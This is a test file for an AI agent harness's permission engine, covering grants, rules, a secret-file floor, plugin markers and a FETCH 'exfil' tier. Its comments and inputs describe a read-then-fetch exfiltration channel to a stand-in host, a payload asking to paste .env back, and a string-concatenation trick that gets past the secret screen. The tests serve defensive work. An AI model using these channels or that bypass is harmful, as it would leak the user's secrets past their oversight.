// The permission engine's waiting behaviour: timeoutMs 0 means the question
// stays open until a human answers — the desktop's shape — while a timeout
// resolves to deny, never a hang. Plus the persisted rules and grants
// (harness/rules.mjs): "always" answers survive a restart, project rules are
// seeded from the file, and the caller's own rules outrank them.
import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { Emitter } from '../harness/events.mjs';
import { PermissionEngine, classify, classifyPlugin } from '../harness/permissions.mjs';
import { RulesStore } from '../harness/rules.mjs';
import { Harness } from '../harness/harness.mjs';

const tick = (ms) => new Promise((r) => setTimeout(r, ms));
const tempDir = () => fs.mkdtempSync(path.join(os.tmpdir(), 'aipass-rules-'));

test('timeoutMs 0 waits for the answer instead of denying', async () => {
  const events = new Emitter();
  let question = null;
  events.on('permission_request', (q) => { question = q; });

  const engine = new PermissionEngine({ mode: 'ask', events, timeoutMs: 0 });
  const pending = engine.request({ kind: 'write', arg: 'src/a.ts', preview: 'x' });
  let settled = false;
  pending.then(() => { settled = true; }, () => { settled = true; });

  await tick(150);
  assert.equal(settled, false, 'no silent deny while the human reads the diff');
  assert.ok(question, 'the question is on the events for the window to show');

  engine.answer(question.id, 'allow');
  assert.equal(await pending, 'allow');
});

test('a timeout still resolves to deny rather than hanging', async () => {
  const events = new Emitter();
  let question = null;
  events.on('permission_request', (q) => { question = q; });

  const engine = new PermissionEngine({ mode: 'ask', events, timeoutMs: 50 });
  const verdict = await engine.request({ kind: 'write', arg: 'a.txt', preview: 'x' });
  assert.equal(verdict, 'deny');
  assert.equal(engine.answer(question.id, 'allow'), false, 'a decided question is closed');
});

test('an "always" answer writes through to the store and is honoured after a restart', () => {
  const dir = tempDir();
  const root = path.join(dir, 'proj');
  fs.mkdirSync(root);
  const file = path.join(dir, 'rules.json');
  const store = new RulesStore(file);

  const first = new PermissionEngine({
    mode: 'ask',
    onGrant: (kind, arg) => store.addGrant(root, kind, arg),
  });
  first.grant('write', 'src/config.ts');

  // A process restart: a fresh store, a fresh engine seeded from the file.
  const seeded = new RulesStore(file).forRoot(root);
  assert.deepEqual(seeded.grants, [{ kind: 'write', arg: 'src/config.ts' }]);
  const second = new PermissionEngine({ mode: 'ask', rules: seeded.rules });
  for (const g of seeded.grants) second.grants.set(`${g.kind}:${g.arg}`, 'allow');
  assert.equal(second.evaluate({ kind: 'write', arg: 'src/config.ts' }).decision, 'allow');
  assert.equal(second.evaluate({ kind: 'write', arg: 'src/other.ts' }).decision, 'ask', 'one file, not the directory');

  // Granting the same thing twice does not duplicate the entry.
  first.grant('write', 'src/config.ts');
  assert.equal(new RulesStore(file).forRoot(root).grants.length, 1);
});

test('a grant does not outlive the rule that came after it, and never reaches a secret file', () => {
  // An "always" answer is remembered FOREVER: the grant is written to the
  // rules file and re-seeded on every start. It used to be checked FIRST, so
  // a `deny` rule the person wrote later never took effect — and a grant
  // given to a secret file outlived the rule that had allowed it.
  const engine = new PermissionEngine({ mode: 'ask' });
  engine.grant('write', 'src/config.ts');
  engine.grant('write', '.env');
  assert.equal(engine.evaluate({ kind: 'write', arg: 'src/config.ts' }).decision, 'allow', 'the grant holds');

  // A rule written after the grant wins over it.
  engine.rules = [{ pattern: 'src/**', decision: 'deny' }];
  assert.equal(engine.evaluate({ kind: 'write', arg: 'src/config.ts' }).decision, 'deny',
    'the rule the person wrote later wins over the grant they gave earlier');

  // A secret file is denied whatever the answer was once — in every mode.
  const secret = new PermissionEngine({ mode: 'yolo' });
  secret.grant('write', '.env');
  assert.equal(secret.evaluate({ kind: 'write', arg: '.env' }).decision, 'deny',
    'a secret file stays denied in every mode, grant or not');
  assert.equal(secret.evaluate({ kind: 'read', arg: '.env' }).decision, 'deny',
    'and a read is refused too');
});

test('a grant still beats the safety floor and the mode — "always" means always', () => {
  // The safety floor asks about the first mutation of a file a build resolves
  // through. A grant is the person saying "yes, that file, every time" — it
  // sits above that floor, and the floor still asks for everything else.
  const engine = new PermissionEngine({ mode: 'ask' });
  engine.grant('write', 'package.json');
  assert.equal(engine.evaluate({ kind: 'write', arg: 'package.json' }).decision, 'allow',
    'the granted file is not asked about again');
  assert.equal(engine.evaluate({ kind: 'write', arg: 'tsconfig.json' }).decision, 'ask',
    'a file that was never granted is still asked about');
  assert.equal(engine.evaluate({ kind: 'read', arg: 'package.json' }).decision, 'allow',
    'a read is never granted and never asked about');
});

test('Harness seeds persisted rules, honours grants, and caller rules outrank the file', () => {
  const dir = tempDir();
  const root = path.join(dir, 'proj');
  fs.mkdirSync(path.join(root, 'src'), { recursive: true });
  const file = path.join(dir, 'rules.json');
  const store = new RulesStore(file);
  store.setRules(root, [
    { pattern: '.env*', decision: 'deny' },
    { pattern: 'src/**', decision: 'allow' },
  ]);

  const h = new Harness({ root, rulesFile: file, store: 'off', bridgeURL: 'http://127.0.0.1:1' });
  assert.equal(h.permissions.evaluate({ kind: 'write', arg: '.env' }).decision, 'deny', 'persisted deny applies');
  assert.equal(h.permissions.evaluate({ kind: 'write', arg: 'src/x.ts' }).decision, 'allow', 'persisted allow applies');
  assert.equal(h.permissions.evaluate({ kind: 'write', arg: 'other.ts' }).decision, 'ask', 'no rule — the mode decides');

  // The caller's own rules come first, so they outrank the file.
  const h2 = new Harness({
    root, rulesFile: file, store: 'off', bridgeURL: 'http://127.0.0.1:1',
    rules: [{ pattern: 'src/**', decision: 'deny' }],
  });
  assert.equal(h2.permissions.evaluate({ kind: 'write', arg: 'src/x.ts' }).decision, 'deny');

  // A grant made through the harness is written through and survives.
  h.permissions.grant('write', 'one.ts');
  const grants = new RulesStore(file).forRoot(root).grants;
  assert.ok(grants.some((g) => g.kind === 'write' && g.arg === 'one.ts'), 'the grant is persisted');
});

/* ------------------------------------------------------------ the plugin gate */

test('a plugin marker is classified like a write unless it declared a risk', () => {
  // The plugin's own word is taken as given.
  assert.equal(classifyPlugin('read'), 'read');
  assert.equal(classifyPlugin('write'), 'write');
  assert.equal(classifyPlugin('shell'), 'shell');
  // Silence is not a declaration: a plugin's code runs in this process with
  // the harness's access, so an undeclared marker is not a read.
  assert.equal(classifyPlugin(null), 'write');
  assert.equal(classifyPlugin(undefined), 'write');
  assert.equal(classifyPlugin('nonsense'), 'write');
  // The exfil tier is not a word a plugin may declare: it names the
  // built-ins that move data out, and a marker is the plugin's own code —
  // it rides the write or the shell gate, which ask.
  assert.equal(classifyPlugin('exfil'), 'write', 'a plugin cannot declare the exfil tier');
  // The same answer through the kind-based classifier, so a caller that has
  // no risk of its own still gets the safe one.
  assert.equal(classify('plugin'), 'write');
  assert.equal(classify('plugin', 'anything'), 'write');
  // A built-in is untouched by any of this.
  assert.equal(classify('read'), 'read');
  assert.equal(classify('replace'), 'write');
  assert.equal(classify('run', 'ls -la'), 'shell');
});

test("a person's rules and the secret floor reach a plugin marker's argument", () => {
  const engine = new PermissionEngine({
    mode: 'ask',
    rules: [{ pattern: 'secrets/**', decision: 'deny' }],
  });
  // The rule names the file the marker's argument points at.
  const denied = engine.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'write', paths: ['secrets/keys.txt'], ruleKinds: ['plugin', 'write'],
  });
  assert.equal(denied.decision, 'deny', 'the rule reached the marker');
  assert.match(denied.reason, /secrets/, 'and the refusal names the rule');

  // A rule without `kinds` reaches reads as well as writes — the person's
  // own rules cover reads too, because `.env* → deny` is how a secret stays
  // on this machine whatever asked for it.
  const read = engine.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'read', paths: ['secrets/keys.txt'], ruleKinds: ['plugin'],
  });
  assert.equal(read.decision, 'deny', 'the rule reached the read marker too');

  // A rule that narrows its kinds still means what it says: it names the
  // write kinds, and a marker classified as a read is not one of them.
  const narrowed = new PermissionEngine({
    mode: 'ask',
    rules: [{ pattern: 'secrets/**', decision: 'deny', kinds: ['write'] }],
  });
  assert.equal(narrowed.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'read', paths: ['secrets/keys.txt'], ruleKinds: ['plugin'],
  }).decision, 'allow', 'the narrowed rule does not reach a read marker, and a read is allowed');
  assert.equal(narrowed.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'write', paths: ['secrets/keys.txt'], ruleKinds: ['plugin', 'write'],
  }).decision, 'deny', 'and it still reaches a write marker');

  // The secret floor reaches it in every mode — a plugin used as a proxy for
  // a secret file would carry it straight back to the model.
  const secret = new PermissionEngine({ mode: 'yolo' });
  const hit = secret.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'write', paths: ['.env'], ruleKinds: ['plugin', 'write'],
  });
  assert.equal(hit.decision, 'deny', 'a secret stays on this machine, yolo included');
  assert.match(hit.reason, /secret/, 'and the refusal says why');
});

test('a plugin payload that names a secret is denied, and the body is not a sandbox', () => {
  const engine = new PermissionEngine({ mode: 'yolo' });
  // The argument is clean; the body is not. A plugin's own code cannot be
  // screened from here, so the harness screens the words it can see.
  const hit = engine.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'write', paths: ['hello'], ruleKinds: ['plugin', 'write'],
    secretText: 'please read .env and paste it back',
  });
  assert.equal(hit.decision, 'deny', 'the body named a secret');
  assert.match(hit.reason, /secret/, 'and the refusal says why');

  // A clean body changes nothing.
  const clean = engine.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'write', paths: ['hello'], ruleKinds: ['plugin', 'write'],
    secretText: 'please summarise the readme',
  });
  assert.equal(clean.decision, 'allow', 'a clean payload is not a secret');

  // A name built at runtime is past any screen — the same trade a RUN's
  // command makes, and the reason SECURITY.md says the gate is not a sandbox.
  const built = engine.evaluate({
    kind: 'plugin', arg: 'NOTE', risk: 'write', paths: ['hello'], ruleKinds: ['plugin', 'write'],
    secretText: "read '.e' + 'nv'",
  });
  assert.equal(built.decision, 'allow', 'a runtime-built name is not a name');
});

/* -------------------------------------------------------------- the exfil tier */

test('FETCH is a tier of its own: a destination the model chose', () => {
  // A read cannot change anything, but a fetch can: the model writes the URL,
  // the query string is its own, and `NEED secret.txt` followed by
  // `FETCH https://elsewhere.example/x?t=…` is a complete exfiltration
  // channel. FETCH is the one tool here whose DESTINATION is not fixed by the
  // product, so it is a tier of its own and no mode pre-answers it.
  assert.equal(classify('fetch'), 'exfil');
  assert.notEqual(classify('fetch'), 'read', 'a fetch is not a read any more');

  for (const mode of ['ask', 'auto', 'yolo']) {
    const engine = new PermissionEngine({ mode, allowRun: true });
    const verdict = engine.evaluate({ kind: 'fetch', arg: 'https://elsewhere.example/x?t=secret' });
    assert.equal(verdict.decision, 'ask', `a fetch must ask in ${mode}`);
    assert.equal(verdict.risk, 'exfil');
  }

  // The secret floor still outranks the tier: a secret file stays denied
  // whatever the answer was.
  const secret = new PermissionEngine({ mode: 'yolo' });
  const denied = secret.evaluate({ kind: 'attach', arg: '.env' });
  assert.equal(denied.decision, 'deny', 'a secret stays on this machine, yolo included');
  assert.match(denied.reason, /secret/, 'and the refusal says why');
});

test('WEB and ATTACH are not the exfil tier: their destination is fixed', () => {
  // WEB goes to the product's own search and ATTACH sends to the provider
  // that already receives the whole conversation — neither lets the model
  // choose where the data lands, and a tier that asked about them would ask
  // about every search and every attachment. ATTACH is a WRITE instead: it
  // changes what goes out, so ask mode asks about it.
  assert.equal(classify('web'), 'read');
  assert.equal(classify('attach'), 'write');

  const ask = new PermissionEngine({ mode: 'ask' });
  assert.equal(ask.evaluate({ kind: 'attach', arg: 'logo.png' }).decision, 'ask',
    'ask mode asks about an attachment');
  const auto = new PermissionEngine({ mode: 'auto' });
  assert.equal(auto.evaluate({ kind: 'attach', arg: 'logo.png' }).decision, 'allow',
    'auto mode lets it through, like any other write');
});

test('a surface with no window to ask in says yes on the command line', () => {
  // The CLI has no window: a question there is a question nobody can answer
  // and the fetch is refused. `--allow-fetch` is the consent, the way
  // `--allow-run` is for the shell.
  const engine = new PermissionEngine({ mode: 'yolo', allowExfil: true });
  assert.equal(engine.evaluate({ kind: 'fetch', arg: 'https://elsewhere.example/x' }).decision, 'allow',
    'the flag is the consent');
  const off = new PermissionEngine({ mode: 'yolo' });
  assert.equal(off.evaluate({ kind: 'fetch', arg: 'https://elsewhere.example/x' }).decision, 'ask',
    'without it, the question stands');
});

test('an "always" the person gave for one destination covers that one only', () => {
  // The tier asks, but the person's own answer still counts: a grant is
  // keyed by the argument, and the argument of a FETCH is the whole URL —
  // query string included. So a remembered "always" cannot become a blanket
  // for a URL the model writes later.
  const engine = new PermissionEngine({ mode: 'yolo' });
  engine.grant('fetch', 'https://known.example/docs');
  assert.equal(engine.evaluate({ kind: 'fetch', arg: 'https://known.example/docs' }).decision, 'allow',
    'the destination the person saw is the one that is covered');
  assert.equal(engine.evaluate({ kind: 'fetch', arg: 'https://known.example/docs?t=secret' }).decision, 'ask',
    'a different URL is a different question');
  assert.equal(engine.evaluate({ kind: 'fetch', arg: 'https://elsewhere.example/x' }).decision, 'ask',
    'and so is another destination');
});

test('a plugin marker rides its own risk: a read is allowed, silence is a write', () => {
  const engine = new PermissionEngine({ mode: 'ask' });
  // The plugin's own word is taken as given: a declared read marker is a
  // read, and a read is not asked about.
  const read = engine.evaluate({ kind: 'plugin', arg: 'NOTE', risk: 'read', ruleKinds: ['plugin'] });
  assert.equal(read.decision, 'allow', 'a declared read marker is not asked about');
  // Silence is not a declaration: an undeclared marker is classified like a
  // write, so it is a question.
  const undeclared = engine.evaluate({ kind: 'plugin', arg: 'NOTE' });
  assert.equal(undeclared.risk, 'write', 'an undeclared marker is a write');
  assert.equal(undeclared.decision, 'ask', 'and a write is asked about');
});

/* --------------------------------------------------- the rules and the modes */

test("a person's rules reach every token of the argument, not only the first", () => {
  // A MOVE names two paths, and the destination is the one a rule was
  // written to stop: `dist/** → deny` used to be checked against the SOURCE
  // only, so `MOVE a.txt dist/evil.js` walked straight past it. The safety
  // floor and the secret floor always looked at both ends — the user's own
  // rules did not.
  const engine = new PermissionEngine({ mode: 'ask', rules: [{ pattern: 'dist/**', decision: 'deny' }] });
  const denied = engine.evaluate({ kind: 'move', arg: 'a.txt dist/evil.js' });
  assert.equal(denied.decision, 'deny', 'the destination is screened too');
  assert.match(denied.reason, /dist/, 'and the refusal names the rule');
  // The source is still screened.
  assert.equal(engine.evaluate({ kind: 'move', arg: 'dist/old.js notes.txt' }).decision, 'deny',
    'the source counts as well');
  // A move no rule names is still a question.
  assert.equal(engine.evaluate({ kind: 'move', arg: 'a.txt notes.txt' }).decision, 'ask');
});

test('auto asks about a shell command — yolo is the mode that lets it through', () => {
  // The header says it: `auto` is the old `--apply` (writes go through), and
  // `yolo` is the old `--apply --allow-run` (the shell goes through too).
  // `auto` + allowRun used to let every command through without a question,
  // which is not what the mode says it is.
  const auto = new PermissionEngine({ mode: 'auto', allowRun: true });
  const verdict = auto.evaluate({ kind: 'run', arg: '', body: 'node check.mjs' });
  assert.equal(verdict.decision, 'ask', 'auto asks about the shell');
  assert.equal(verdict.risk, 'shell');

  const yolo = new PermissionEngine({ mode: 'yolo', allowRun: true });
  assert.equal(yolo.evaluate({ kind: 'run', arg: '', body: 'node check.mjs' }).decision, 'allow',
    'yolo lets the shell through');
});

test('a remembered "always" covers a command, not every command', () => {
  const written = [];
  const engine = new PermissionEngine({ mode: 'ask', onGrant: (kind, arg) => written.push({ kind, arg }) });

  // The legacy blanket: a grant stored with no argument, the constant 'run:'
  // every RUN used to share. It must not cover a command it was never asked
  // about — the safe reading of it is "ask again".
  engine.grants.set('run:', 'allow');
  assert.equal(engine.evaluate({ kind: 'run', arg: '', body: 'node check.mjs' }).decision, 'ask',
    'a legacy blanket grant does not cover a new command');

  // A grant recorded for this command's shape covers that shape...
  engine.grant('run', '', 'node check.mjs');
  assert.equal(engine.evaluate({ kind: 'run', arg: '', body: 'node check.mjs' }).decision, 'allow',
    'the command the person said "always" to is not asked about again');
  // ...and nothing else.
  assert.equal(engine.evaluate({ kind: 'run', arg: '', body: 'npm publish' }).decision, 'ask',
    'a different command is a different question');
  assert.equal(engine.evaluate({ kind: 'run', arg: '', body: 'node other.mjs' }).decision, 'ask',
    'and so is another program of the same name');

  // The stored form of a shell grant is the command's shape — the contract
  // harness/rules.mjs writes the persisted file against.
  assert.deepEqual(written, [{ kind: 'run', arg: 'node check.mjs' }]);

  // A grant for one file is still one file.
  engine.grant('write', 'src/config.ts');
  assert.equal(engine.evaluate({ kind: 'write', arg: 'src/config.ts' }).decision, 'allow');
  assert.equal(engine.evaluate({ kind: 'write', arg: 'src/other.ts' }).decision, 'ask');
});
